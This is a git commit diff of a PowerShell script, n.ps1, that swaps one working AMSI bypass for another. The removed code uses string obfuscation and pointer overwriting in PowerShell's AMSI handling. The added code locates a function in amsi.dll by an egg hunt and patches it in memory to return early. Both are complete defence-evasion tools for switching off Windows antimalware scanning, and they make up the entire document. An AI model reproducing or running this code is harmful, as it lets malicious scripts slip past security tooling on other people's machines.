4ca99cc3043ae501ba2c6ec17e45099ca8ad68fb
Iván Cabrera <103500562+ivancabrera02@users.noreply.github.com>
2024-07-11 14:25:37 +0200

    Update n.ps1

--- n.ps1
+++ n.ps1
@@ -1,124 +1,125 @@
-function MagicBypass {
+Write-Host "-- AMSI Patch"
+Write-Host "-- Modified By: Shantanu Khandelwal (@shantanukhande)"
+Write-Host "-- Original Author: Paul Laîné (@am0nsec)"
+Write-Host ""
 
-# Define named parameters
-param(
-    $InitialStart = 0x50000,
-    $NegativeOffset= 0x50000,
-    $MaxOffset = 0x1000000,
-    $ReadBytes = 0x50000
+Class Hunter {
+    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
+        while ($true) {
+            [int]$count = 0
+
+            while ($true) {
+                [IntPtr]$address = [IntPtr]::Add($address, 1)
+                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
+                    $count++
+                    If ($count -eq $egg.Length) {
+                        return [IntPtr]::Subtract($address, $egg.Length - 1)
+                    }
+                } Else { break }
+            }
+        }
+
+        return $address
+    }
+}
+function Get-ProcAddress {
+    Param(
+        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
+    )
+
+    # Get a reference to System.dll in the GAC
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    # Get a reference to the GetModuleHandle and GetProcAddress methods
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+    # Get a handle to the module specified
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr = New-Object IntPtr
+    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+    # Return the address of the function
+    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+}
+function Get-DelegateType
+{
+    Param
+    (
+        [OutputType([Type])]
+            
+        [Parameter( Position = 0)]
+        [Type[]]
+        $Parameters = (New-Object Type[](0)),
+            
+        [Parameter( Position = 1 )]
+        [Type]
+        $ReturnType = [Void]
+    )
+
+    $Domain = [AppDomain]::CurrentDomain
+    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+        
+    Write-Output $TypeBuilder.CreateType()
+}
+$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
+$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
+$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
+$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
+$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
+$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
+$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
+$VistualProtectDelegate =  Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)
+
+
+If ([IntPtr]::Size -eq 8) {
+    Write-Host "[+] 64-bits process"
+    [byte[]]$egg = [byte[]] (
+        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
+        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
+        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
+        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
+        0x57,                   # push    rdi
+        0x41, 0x56,             # push    r14
+        0x41, 0x57,             # push    r15
+        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
+    )
+} Else {
+    Write-Host "[+] 32-bits process"
+    [byte[]]$egg = [byte[]] (
+        0x8B, 0xFF,             # mov     edi,edi
+        0x55,                   # push    ebp
+        0x8B, 0xEC,             # mov     ebp,esp
+        0x83, 0xEC, 0x18,       # sub     esp,18h
+        0x53,                   # push    ebx
+        0x56                    # push    esi
+    )
+}
+
+
+$hModule = $LoadLibrary.Invoke("amsi.dll")
+Write-Host "[+] AMSI DLL Handle: $hModule"
+$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, "DllGetClassObject")
+Write-Host "[+] DllGetClassObject address: $DllGetClassObjectAddress"
+[IntPtr]$targetedAddress = [Hunter]::FindAddress($DllGetClassObjectAddress, $egg)
+Write-Host "[+] Targeted address: $targetedAddress"
+
+$oldProtectionBuffer = 0
+$VirtualProtect.Invoke($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null
+
+$patch = [byte[]] (
+    0x31, 0xC0,    # xor rax, rax
+    0xC3           # ret  
 )
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
 
-$APIs = @"
-using System;
-using System.ComponentModel;
-using System.Management.Automation;
-using System.Reflection;
-using System.Runtime.CompilerServices;
-using System.Runtime.InteropServices;
-using System.Text;
-
-public class APIs {
-    [DllImport("kernel32.dll")]
-    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
-
-    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-   
-    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
-    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
-
-    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
-    public static int Dummy() {
-     return 1;
-    }
-}
-"@
-
-Add-Type $APIs
-
-$InitialDate=Get-Date;
-
-$string = 'hello, world'
-$string = $string.replace('he','a')
-$string = $string.replace('ll','m')
-$string = $string.replace('o,','s')
-$string = $string.replace(' ','i')
-$string = $string.replace('wo','.d')
-$string = $string.replace('rld','ll')
-
-$string2 = 'hello, world'
-$string2 = $string2.replace('he','A')
-$string2 = $string2.replace('ll','m')
-$string2 = $string2.replace('o,','s')
-$string2 = $string2.replace(' ','i')
-$string2 = $string2.replace('wo','Sc')
-$string2 = $string2.replace('rld','an')
-
-$string3 = 'hello, world'
-$string3 = $string3.replace('hello','Bu')
-$string3 = $string3.replace(', ','ff')
-$string3 = $string3.replace('world','er')
-
-$Address = [APIS]::GetModuleHandle($string)
-[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)
-
-$Assemblies = [appdomain]::currentdomain.getassemblies()
-$Assemblies |
-  ForEach-Object {
-    if($_.Location -ne $null){
-     $split1 = $_.FullName.Split(",")[0]
-     If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
-       $Types = $_.GetTypes()
-     }
-    }
-}
-
-$Types |
-  ForEach-Object {
-    if($_.Name -ne $null){
-     If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
-       $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
-     }
-    }
-}
-
-$Methods |
-  ForEach-Object {
-    if($_.Name -ne $null){
-     If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
-       $MethodFound = $_
-     }
-    }
-}
-
-[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
-[IntPtr] $Handle = [APIs]::GetCurrentProcess()
-$dummy = 0
-$ApiReturn = $false
-   
-:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
-    [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
-    $ReadedMemoryArray = [byte[]]::new($ReadBytes)
-    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
-    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
-     $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
-     [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
-     if ($PointerToCompare -eq $funcAddr) {
-       Write-Host "Found @ $($i)!"
-       [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
-       break initialloop
-     }
-    }
-}
-[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
-$buf = [IntPtr[]] ($DummyPointer)
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
-
-$FinishDate=Get-Date;
-$TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
-Write-Host "$TimeElapsed seconds"
-}
-MagicBypass
+$a = 0
+$VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
